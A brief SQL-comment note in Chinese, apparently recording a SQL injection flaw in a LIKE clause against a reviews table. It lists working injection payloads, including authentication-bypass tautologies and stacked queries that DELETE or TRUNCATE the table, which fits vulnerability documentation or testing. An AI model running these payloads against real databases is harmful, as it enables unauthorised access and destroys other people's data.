-- 1. LIKE子句注入漏洞
-- 在以下查询中发现可以注入:
SELECT * FROM review_system.reviews_partitioned WHERE content LIKE '{}' 

-- 成功的注入模式:
' OR '1'='1
' OR 1=1 --
admin'--
1' OR '1' = '1
'; DELETE FROM review_system.reviews_partitioned; --
'; TRUNCATE TABLE review_system.reviews_partitioned; -- 